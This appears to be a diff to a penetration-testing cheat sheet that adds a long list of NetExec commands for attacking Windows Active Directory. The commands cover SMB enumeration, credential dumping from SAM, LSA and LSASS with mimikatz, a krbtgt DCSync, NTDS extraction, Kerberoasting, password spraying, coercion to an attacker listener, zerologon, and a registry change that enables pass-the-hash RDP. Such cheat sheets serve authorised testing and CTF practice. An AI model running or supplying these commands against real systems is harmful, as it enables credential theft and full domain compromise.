@@ -38,3 +38,38 @@ netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
+nxc smb "$IP" -u '' -p ''
+nxc smb "$IP" -u '' -p '' --shares
+nxc smb "$IP" -u 'Guest' -p '' --shares
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --pass-pol
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --loggedon-users
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --sam
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --lsa
+nxc smb "$IP" -u "$USER" -H "$NT_HASH" --local-auth
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --rid-brute 5000
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --rid-brute 100000 | grep SidTypeUser
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --spider "$SHARE" --content --pattern "passw"
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --spider C\$ --pattern flag
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M spider_plus -o SHARE="$SHARE" DOWNLOAD_FLAG=True
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -x 'whoami' --exec-method smbexec
+nxc smb "$CIDR" --gen-relay-list relay_targets.txt
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M lsassy
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M nanodump
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M mimikatz
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M mimikatz -o COMMAND='"lsadump::dcsync /domain:$DOMAIN /user:krbtgt"'
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M ntdsutil
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --asreproast asrep.txt
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoasting kerb.txt --kdcHost "$IP"
+nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --bloodhound -c all --dns-server "$IP"
+nxc smb "$IP" -u users.txt -p users.txt --no-bruteforce --continue-on-success
+nxc smb "$IP" -u valid_users.txt -p "$PASSWORD" --continue-on-success
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoasting kerb.txt
+nxc smb "$IP" -u "" -p "" -M timeroast
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-krb5-file /etc/krb5.conf
+nxc smb "$DOMAIN" -u "$USER" -p "$PASSWORD" -M coerce_plus -o LISTENER="$LHOST"
+nxc smb "$DOMAIN" -u "$USER" -p "$PASSWORD" -M printerbug
+nxc smb "$IP" -M zerologon
+nxc smb "$IP" -u "$USER" -H "$NT_HASH" --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+proxychains nxc smb "$IP"
+for MODULE in $(cat smb.txt); do  nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M $MODULE ; done
+for MODULE in $(cat ldap.txt); do  nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M $MODULE ; done
